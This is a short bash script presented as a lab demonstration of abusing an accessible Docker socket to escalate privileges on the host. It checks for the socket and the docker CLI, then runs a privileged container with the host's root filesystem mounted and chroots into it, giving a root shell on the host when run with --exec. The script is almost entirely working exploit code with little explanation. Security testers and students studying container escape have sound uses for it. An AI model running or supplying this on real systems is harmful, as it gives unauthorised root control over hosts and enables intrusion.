#!/bin/bash
# Demonstration of abusing the Docker socket for host privilege escalation.
# Run only in a controlled lab environment.

set -euo pipefail

SOCKET="${DOCKER_SOCK:-/var/run/docker.sock}"
IMAGE="${1:-alpine}"

if [ ! -S "$SOCKET" ]; then
  echo "[-] Docker socket $SOCKET not accessible."
  exit 1
fi

if ! command -v docker >/dev/null 2>&1; then
  echo "[-] docker CLI not found in PATH."
  exit 1
fi

CMD=(docker run --rm -it --privileged -v /:/host "$IMAGE" chroot /host /bin/sh)

if [ "${2:-}" = "--exec" ]; then
  echo "[+] Executing: ${CMD[*]}"
  "${CMD[@]}"
else
  echo "[+] Docker socket detected: $SOCKET"
  echo "[+] Would execute: ${CMD[*]}"
  echo "    Pass --exec as second argument to actually run the container."
fi
